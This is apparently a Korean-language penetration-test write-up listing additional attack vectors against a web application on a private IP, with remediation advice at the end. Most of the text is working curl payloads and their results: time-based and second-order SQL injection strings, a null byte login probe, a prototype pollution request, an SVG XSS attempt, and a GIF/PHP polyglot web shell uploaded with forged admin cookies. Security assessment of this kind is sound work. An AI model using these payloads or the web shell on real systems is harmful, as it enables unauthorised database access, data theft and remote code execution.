# 추가 공격 벡터 (Additional Attack Vectors)

## 1. Time-based Blind SQL Injection

### SQLite Heavy Query
```bash
curl -X POST \
  -d "username=admin'||randomblob(100000000)||'&password=test" \
  "http://10.210.136.53:3000/login" \
  -w "Time: %{time_total}s"
```

**결과**:
- 정상 요청: ~0.007초
- Heavy query: ~0.5초

**분석**: SQLite의 `randomblob()` 함수를 사용한 시간 기반 공격 가능

---

## 2. Second-Order SQL Injection

### 악성 사용자명 등록
```bash
curl -X POST \
  -d "username=hacker',(SELECT password FROM users WHERE username='admin'))--&password=test123" \
  "http://10.210.136.53:3000/signup"
```

**결과**: 사용자명이 그대로 데이터베이스에 저장됨
- 저장된 값: `hacker',(SELECT password FROM users WHERE username='admin'))--`

**잠재적 공격**:
- 사용자명이 다른 쿼리에 사용될 때 SQL Injection 트리거
- 관리자 패널에서 사용자 목록 조회 시 영향

---

## 3. Mass Data Exposure

### 무제한 페이지네이션
```bash
curl "http://10.210.136.53:3000/board?limit=9999999"
```

**결과**: 106KB+ 데이터 반환 (전체 게시물)

**영향**:
- 서버 리소스 고갈 가능
- 모든 게시물 한 번에 추출 가능
- Rate Limiting 없이 대량 데이터 접근

---

## 4. Null Byte Injection

### 로그인 시 Null Byte
```bash
curl -X POST \
  -d "username=admin%00test&password=admin123" \
  "http://10.210.136.53:3000/login"
```

**결과**: 500 Internal Server Error

**분석**:
- 서버가 null byte를 제대로 처리하지 못함
- 에러 핸들링 취약점
- 잠재적 bypass 가능성

---

## 5. Polyglot File Upload

### GIF + PHP Webshell
```bash
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@shell.gif;type=image/gif" \
  "http://10.210.136.53:3000/profile/upload"
```

**결과**:
- 파일 업로드 성공
- `/uploads/shell.gif`에서 직접 접근 가능
- GIF 헤더로 이미지 검증 우회

**영향**:
- PHP 서버라면 원격 코드 실행
- 현재 Node.js 서버라 실행 안됨
- 콘텐츠 검증 부재 증명

---

## 6. HTTP Method Testing

### OPTIONS 응답
```
Allow: GET, HEAD
```

### TRACE (비활성화)
```
Cannot TRACE /
```

### DELETE (비활성화)
```
Cannot DELETE /admin/users/5
```

**분석**: 불필요한 메서드는 비활성화되어 있음

---

## 7. XSS Filter Bypass 시도

### SVG XSS (차단됨)
```bash
curl -X POST \
  -d "name=<svg/onload=alert(1)>&price=100&description=test" \
  "http://10.210.136.53:3000/admin/products/2"
```

**결과**: HTML 엔티티로 이스케이프됨
- `&lt;svg/onload=alert(1)&gt;`

**분석**: 상품명 XSS는 차단되지만, 게시판 XSS는 취약

---

## 8. Error-based Information Disclosure

### JSON 파싱 에러
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}' \
  "http://10.210.136.53:3000/login"
```

**결과**: 500 Internal Server Error

**분석**:
- 상세 에러 메시지는 노출되지 않음
- 하지만 비정상 입력에 대한 핸들링 부재
- 프로토타입 오염 시도 가능성

---

## 취약점 영향도 매트릭스

| 공격 벡터 | 성공 여부 | 영향도 | 비고 |
|-----------|-----------|--------|------|
| Time-based SQLi | O | Medium | 데이터 추출 가능 |
| Second-Order SQLi | △ | High | 저장됨, 트리거 필요 |
| Mass Data Exposure | O | Medium | 106KB+ 데이터 |
| Null Byte Injection | O | Low | 500 에러 유발 |
| Polyglot Upload | O | High | 콘텐츠 검증 우회 |
| SVG XSS | X | - | 이스케이프됨 |

---

## 추가 권장 조치

1. **페이지네이션 제한**: limit 파라미터 최대값 설정
2. **입력 정규화**: Null byte, 특수문자 필터링
3. **파일 콘텐츠 검증**: Magic bytes 뿐만 아니라 실제 콘텐츠 검사
4. **에러 핸들링**: 모든 입력에 대해 graceful 에러 처리
5. **2차 SQLi 방지**: 저장된 데이터도 쿼리 시 파라미터화
